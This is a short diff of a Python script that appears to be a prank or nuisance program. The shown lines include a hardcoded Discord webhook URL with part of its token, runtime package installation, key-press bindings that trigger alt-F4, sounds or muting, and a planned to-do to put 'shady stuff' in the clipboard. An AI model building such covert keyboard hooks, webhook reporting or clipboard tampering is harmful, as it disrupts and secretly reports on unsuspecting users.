@@ -17,6 +17,10 @@ webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQD
 
 # regarder si on peut mettre plusieurs touches dans keylist dans add_key_press_event
 
+# mettre des trucks louche dans le clipboard
+
+# Faire que log ne bloque pas la suite du programme
+
 def install(package):
     if hasattr(pip, 'main'):
         pip.main(['install', package])
@@ -265,7 +269,7 @@ log("Import finished")
 
 # add_key_press_event([Key.caps_lock],[alt_f4])
 # add_key_press_event([Key.esc],[playsound,"https://raw.githubusercontent.com/tonioliii/jkiller/main/fortnite.mp3"])
-add_key_press_event(['\\x03'],[mute])
+# add_key_press_event(['\\x03'],[mute])
 
 while True:
     if actions != []:
